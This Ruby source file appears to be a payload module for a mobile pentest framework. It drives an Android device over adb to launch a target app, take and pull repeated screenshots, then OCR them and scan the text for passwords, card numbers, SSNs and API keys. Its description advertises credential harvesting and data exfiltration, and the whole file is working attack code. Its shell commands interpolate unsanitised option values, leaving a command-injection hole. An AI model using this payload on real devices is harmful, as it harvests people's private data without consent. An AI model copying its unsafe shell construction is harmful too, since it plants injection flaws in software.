require_relative '../../../core/payload_base'

module MPF
  module Payloads
    module Singles
      module Android
        class ScreenshotCapture < MPF::Core::PayloadBase
          
          def register_info
            @info = {
              name: 'Android Screenshot Capture Payload',
              module: 'payload/android/singles/screenshot_capture',
              platform: :android,
              description: 'Captures screenshots from target device to extract sensitive information ' \
                          'displayed on screen. Useful for credential harvesting and data exfiltration.',
              authors: ['MPF Research Team'],
              severity: 'high'
            }
            @payload_type = :single
          end

          def register_options
            add_option('TARGET_PACKAGE', 'Target application package name', required: true)
            add_option('CAPTURE_COUNT', 'Number of screenshots to capture', default: '5')
            add_option('CAPTURE_INTERVAL', 'Interval between captures (seconds)', default: '2')
            add_option('TRIGGER_ACTIVITY', 'Activity to launch before capture', required: false)
            add_option('DEVICE', 'Target device ID', default: 'emulator-5554')
            add_option('OUTPUT_DIR', 'Local directory for screenshots', default: 'reports/payload/screenshots')
          end

          def generate(opts = {})
            count = get_option('CAPTURE_COUNT').to_i
            interval = get_option('CAPTURE_INTERVAL').to_i

            {
              type: 'screenshot_capture',
              capture_count: count,
              interval: interval,
              description: "Capture #{count} screenshots at #{interval}s intervals"
            }
          end

          def execute(target_info)
            validation = validate
            unless validation[:valid]
              return { success: false, error: validation[:errors] }
            end

            package = get_option('TARGET_PACKAGE')
            count = get_option('CAPTURE_COUNT').to_i
            interval = get_option('CAPTURE_INTERVAL').to_i
            device = get_option('DEVICE')
            output_dir = get_option('OUTPUT_DIR')

            print_status("Starting screenshot capture...")
            print_status("Target: #{package}")
            print_status("Captures: #{count} at #{interval}s intervals")

            # Create output directory
            `mkdir -p #{output_dir}` unless Dir.exist?(output_dir)

            # Launch target activity if specified
            if get_option('TRIGGER_ACTIVITY')
              launch_activity(package, get_option('TRIGGER_ACTIVITY'), device)
            else
              # Launch app via launcher
              print_status("Launching application...")
              `adb -s #{device} shell monkey -p #{package} -c android.intent.category.LAUNCHER 1 2>&1`
              sleep(2)
            end

            # Capture screenshots
            screenshots = []
            count.times do |i|
              print_status("Capturing screenshot #{i + 1}/#{count}...")
              
              timestamp = Time.now.strftime('%Y%m%d_%H%M%S')
              filename = "#{package}_#{timestamp}_#{i + 1}.png"
              remote_path = "/sdcard/#{filename}"
              local_path = File.join(output_dir, filename)

              # Capture screenshot
              capture_cmd = "adb -s #{device} shell screencap -p #{remote_path}"
              capture_output = `#{capture_cmd} 2>&1`

              if $?.success?
                # Pull screenshot
                pull_cmd = "adb -s #{device} pull #{remote_path} #{local_path}"
                pull_output = `#{pull_cmd} 2>&1`

                if $?.success? && File.exist?(local_path)
                  file_size = File.size(local_path)
                  print_good("Screenshot saved: #{filename} (#{file_size} bytes)")
                  
                  screenshots << {
                    filename: filename,
                    path: local_path,
                    size: file_size,
                    timestamp: timestamp
                  }

                  # Clean up remote file
                  `adb -s #{device} shell rm #{remote_path} 2>&1`
                else
                  print_error("Failed to pull screenshot #{i + 1}")
                end
              else
                print_error("Failed to capture screenshot #{i + 1}")
              end

              # Wait before next capture (except for last one)
              sleep(interval) if i < count - 1
            end

            # Analyze screenshots for sensitive data
            analysis = analyze_screenshots(screenshots)

            if screenshots.any?
              print_good("Screenshot capture complete!")
              print_status("Captured #{screenshots.length}/#{count} screenshots")
              
              {
                success: true,
                screenshots: screenshots,
                analysis: analysis,
                output_dir: output_dir,
                impact: 'Screen content captured - may contain sensitive information'
              }
            else
              print_error("No screenshots captured")
              {
                success: false,
                error: 'Screenshot capture failed'
              }
            end
          end

          private

          def launch_activity(package, activity, device)
            print_status("Launching activity: #{activity}")
            cmd = "adb -s #{device} shell am start -n #{package}/#{activity}"
            output = `#{cmd} 2>&1`
            
            if $?.success?
              print_good("Activity launched")
              sleep(2)
            else
              print_warning("Failed to launch activity: #{output}")
            end
          end

          def analyze_screenshots(screenshots)
            print_status("Analyzing screenshots for sensitive data...")
            
            analysis = {
              total_screenshots: screenshots.length,
              total_size: screenshots.sum { |s| s[:size] },
              warnings: []
            }

            # Check if OCR tools are available
            tesseract_available = system("which tesseract > /dev/null 2>&1")

            if tesseract_available
              print_status("Tesseract OCR detected - performing text extraction...")
              
              screenshots.each do |screenshot|
                # Extract text using Tesseract
                text_output = "/tmp/#{File.basename(screenshot[:filename], '.png')}.txt"
                ocr_cmd = "tesseract #{screenshot[:path]} #{text_output.gsub('.txt', '')} 2>&1"
                `#{ocr_cmd}`

                if File.exist?(text_output)
                  text_content = File.read(text_output, mode: 'rb').force_encoding('UTF-8').encode('UTF-8', 'UTF-8', invalid: :replace, undef: :replace, replace: '')
                  
                  # Check for sensitive patterns
                  sensitive_patterns = {
                    'password' => /password|passwd|pwd/i,
                    'email' => /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b/,
                    'credit_card' => /\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b/,
                    'phone' => /\b\d{3}[-.]?\d{3}[-.]?\d{4}\b/,
                    'ssn' => /\b\d{3}-\d{2}-\d{4}\b/,
                    'api_key' => /api[_-]?key|token|secret/i
                  }

                  sensitive_patterns.each do |type, pattern|
                    if text_content =~ pattern
                      analysis[:warnings] << {
                        screenshot: screenshot[:filename],
                        type: type,
                        description: "Potential #{type.gsub('_', ' ')} detected in screenshot"
                      }
                    end
                  end

                  File.delete(text_output)
                end
              end
            else
              print_warning("Tesseract OCR not available - skipping text analysis")
              analysis[:warnings] << {
                type: 'info',
                description: 'Install tesseract-ocr for automatic sensitive data detection'
              }
            end

            # Generate analysis report
            report_path = File.join(get_option('OUTPUT_DIR'), 'analysis_report.txt')
            generate_analysis_report(screenshots, analysis, report_path)

            analysis
          end

          def generate_analysis_report(screenshots, analysis, report_path)
            File.open(report_path, 'w') do |f|
              f.puts "Screenshot Capture Analysis Report"
              f.puts "=" * 60
              f.puts "Timestamp: #{Time.now}"
              f.puts "Target Package: #{get_option('TARGET_PACKAGE')}"
              f.puts "Device: #{get_option('DEVICE')}"
              f.puts "\n"
              
              f.puts "Summary:"
              f.puts "-" * 60
              f.puts "Total Screenshots: #{analysis[:total_screenshots]}"
              f.puts "Total Size: #{analysis[:total_size]} bytes"
              f.puts "Warnings: #{analysis[:warnings].length}"
              f.puts "\n"

              f.puts "Screenshots:"
              f.puts "-" * 60
              screenshots.each_with_index do |screenshot, idx|
                f.puts "#{idx + 1}. #{screenshot[:filename]}"
                f.puts "   Path: #{screenshot[:path]}"
                f.puts "   Size: #{screenshot[:size]} bytes"
                f.puts "   Timestamp: #{screenshot[:timestamp]}"
                f.puts ""
              end

              if analysis[:warnings].any?
                f.puts "\nSensitive Data Warnings:"
                f.puts "-" * 60
                analysis[:warnings].each_with_index do |warning, idx|
                  f.puts "#{idx + 1}. #{warning[:description]}"
                  f.puts "   Screenshot: #{warning[:screenshot]}" if warning[:screenshot]
                  f.puts "   Type: #{warning[:type]}"
                  f.puts ""
                end
              end
            end

            print_good("Analysis report saved: #{report_path}")
          end

          def print_status(msg)
            puts "[*] #{msg}"
          end

          def print_good(msg)
            puts "[+] #{msg}"
          end

          def print_warning(msg)
            puts "[!] #{msg}"
          end

          def print_error(msg)
            puts "[-] #{msg}"
          end
        end
      end
    end
  end
end
